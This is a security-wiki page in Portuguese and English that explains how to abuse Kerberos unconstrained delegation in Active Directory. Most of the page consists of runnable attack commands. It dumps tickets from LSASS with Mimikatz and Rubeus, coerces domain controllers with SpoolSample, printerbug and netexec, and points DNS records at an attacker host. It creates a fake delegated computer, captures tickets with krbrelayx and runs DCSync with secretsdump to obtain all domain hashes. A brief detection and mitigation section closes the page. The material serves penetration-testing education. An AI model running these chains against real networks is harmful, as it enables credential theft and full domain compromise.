# Delegation without constraints

{{#include ../../banners/hacktricks-training.md}}

## Delegation without constraints

Esta é um recurso que um Domain Administrator pode definir para qualquer **Computer** dentro do domínio. Então, sempre que um **user logins** no Computer, uma **cópia do TGT** desse usuário vai ser **enviada dentro do TGS** fornecido pelo DC e **armazenada na memória no LSASS**. Então, se você tiver privilégios de Administrator na máquina, você poderá **dump the tickets e impersonate os users** em qualquer máquina.

Então, se um domain admin logins dentro de um Computer com o recurso "Unconstrained Delegation" ativado, e você tiver privilégios de local admin dentro dessa máquina, você poderá dar dump no ticket e impersonate o Domain Admin em qualquer lugar (domain privesc).

Você pode **encontrar objetos Computer com esse atributo** verificando se o atributo [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contém [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Você pode fazer isso com um filtro LDAP de ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, que é o que o powerview faz:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Carregue o ticket do Administrator (ou usuário vítima) na memória com **Mimikatz** ou **Rubeus para um** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Mais info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Mais informações sobre Unconstrained delegation em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Se um atacante conseguir **comprometer um computador permitido para "Unconstrained Delegation"**, ele poderia **enganar** um **Print server** para **fazer login automaticamente** contra ele, **salvando um TGT** na memória do servidor.\
Então, o atacante poderia realizar um **ataque Pass the Ticket para se passar** pelo usuário da conta de computador do Print server.

Para fazer um print server fazer login contra qualquer máquina, você pode usar [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Se o TGT for de um domain controller, você poderia executar um [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) e obter todos os hashes do DC.\
[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Encontre aqui outras formas de **forçar uma autenticação:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Qualquer outro primitive de coerção que faça a vítima autenticar com **Kerberos** para o seu host com unconstrained-delegation também funciona. Em ambientes modernos, isso geralmente significa trocar o fluxo clássico do PrinterBug por **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** ou coerção baseada em **WebClient/WebDAV**, dependendo de qual superfície RPC está acessível.

### Abusando de uma conta de usuário/service com unconstrained delegation

Unconstrained delegation **não se limita a objetos de computador**. Uma **conta de usuário/service** também pode ser configurada como `TRUSTED_FOR_DELEGATION`. Nesse cenário, o requisito prático é que a conta precise receber service tickets Kerberos para um **SPN que ela possua**.

Isso leva a 2 caminhos ofensivos muito comuns:

1. Você compromete a password/hash da **conta de usuário** com unconstrained-delegation e então **adiciona um SPN** nessa mesma conta.
2. A conta já tem um ou mais SPNs, mas um deles aponta para um **hostname antigo/desativado**; recriar o **DNS A record** ausente é suficiente para sequestrar o fluxo de autenticação sem modificar o conjunto de SPNs.

Fluxo mínimo no Linux:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notas:

- Isso é especialmente útil quando o principal unconstrained é uma **service account** e você só tem as credenciais dela, não execução de código em um host joined.
- Se o usuário alvo já tiver um **stale SPN**, recriar o **DNS record** correspondente pode ser menos noisy do que escrever um novo SPN no AD.
- Recent Linux-centric tradecraft usa `addspn.py`, `dnstool.py`, `krbrelayx.py` e um primitive de coercion; você não precisa tocar em um Windows host para completar a cadeia.

### Abusing Unconstrained Delegation with an attacker-created computer

Domínios modernos frequentemente têm `MachineAccountQuota > 0` (padrão 10), permitindo que qualquer principal autenticado crie até N objetos computer. Se você também tiver o privilégio de token `SeEnableDelegationPrivilege` (ou direitos equivalentes), você pode configurar o computer recém-criado para ser trusted for unconstrained delegation e harvest inbound TGTs de sistemas privilegiados.

Fluxo de alto nível:

1) Create a computer you control
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Faça o fake hostname ser resolvível dentro do domínio
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Habilitar Unconstrained Delegation no computador controlado pelo atacante
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Por que isso funciona: com unconstrained delegation, o LSA em um computador com delegation habilitada armazena em cache TGTs de entrada. Se você enganar um DC ou um servidor privilegiado para autenticar no seu host falso, o machine TGT dele será armazenado e poderá ser exportado.

4) Inicie o krbrelayx em modo export e prepare o material Kerberos
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Coagir a autenticação do DC/servidores para o seu host falso
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx vai salvar arquivos ccache quando uma máquina autenticar, por exemplo:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Use o DC machine TGT capturado para executar DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notas e requisitos:

- `MachineAccountQuota > 0` habilita a criação não privilegiada de computadores; caso contrário, você precisa de permissões explícitas.
- Definir `TRUSTED_FOR_DELEGATION` em um computador requer `SeEnableDelegationPrivilege` (ou domain admin).
- Garanta a resolução de nome para seu host falso (registro DNS A) para que o DC consiga alcançá-lo via FQDN.
- A coerção requer um vetor viável (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, etc.). Desative esses em DCs, se possível.
- Se a conta da vítima estiver marcada como **"Account is sensitive and cannot be delegated"** ou for membro de **Protected Users**, o TGT encaminhado não será incluído no service ticket, então essa cadeia não produzirá um TGT reutilizável.
- Se **Credential Guard** estiver habilitado no cliente/servidor autenticador, o Windows bloqueia **Kerberos unconstrained delegation**, o que pode fazer caminhos de coerção que seriam válidos falharem da perspectiva do operador.

Ideias de detecção e hardening:

- Alerta no Event ID 4741 (computer account created) e 4742/4738 (computer/user account changed) quando UAC `TRUSTED_FOR_DELEGATION` estiver definido.
- Monitore adições incomuns de registros DNS A na zona do domínio.
- Observe picos em 4768/4769 vindos de hosts inesperados e autenticações do DC para hosts que não são DC.
- Restrinja `SeEnableDelegationPrivilege` a um conjunto mínimo, defina `MachineAccountQuota=0` onde for viável e desative o Print Spooler em DCs. Imponha LDAP signing e channel binding.

### Mitigation

- Limite logins de DA/Admin a serviços específicos
- Defina "Account is sensitive and cannot be delegated" para contas privilegiadas.

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
